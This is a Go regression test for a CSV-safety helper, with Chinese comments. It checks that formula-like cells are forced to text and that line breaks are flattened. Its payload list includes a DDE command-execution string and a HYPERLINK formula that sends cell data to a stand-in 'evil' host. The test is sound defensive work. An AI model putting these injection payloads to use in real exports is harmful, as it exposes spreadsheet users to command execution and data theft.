package csvsafe

import (
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
)

// csvsafe_test.go —— CSV 注入的安全回归。
//
// 这条断言从 modules/violation 搬过来:护栏当初只装在违规导出上,而邀请日消费
// 与分组矩阵孤儿两份导出的攻击面逐字相同(同样写 BOM 给 Excel 打开、同样直写
// 用户名与令牌名),只是没人把它俩接上。判据放在共用包里,是为了让"再加一份
// CSV 导出"的人能在同一处看到它。
func TestCellNeutralizesSpreadsheetFormulas(t *testing.T) {
	for _, payload := range []string{
		`=cmd|'/c calc'!A1`,
		`=HYPERLINK("http://evil/"&A1,"x")`,
		`+1+1`,
		`-2+3`,
		`@SUM(1:9)`,
	} {
		out := Cell(payload)
		assert.Truef(t, strings.HasPrefix(out, "'"),
			"以 %q 开头的单元格会被电子表格当公式求值,必须强制成文本", payload[:1])
		assert.Equal(t, payload, out[1:], "除了前缀之外内容必须原样保留")
	}

	assert.Equal(t, "normal text", Cell("normal text"), "正常文本不加前缀")
	assert.Equal(t, "", Cell(""))
	assert.Equal(t, "a b c", Cell("a\r\nb\tc"),
		"换行与制表符会让一行记录在表格里裂成几行,而「一行 = 一条记录」是这几份文件唯一的阅读约定")
}
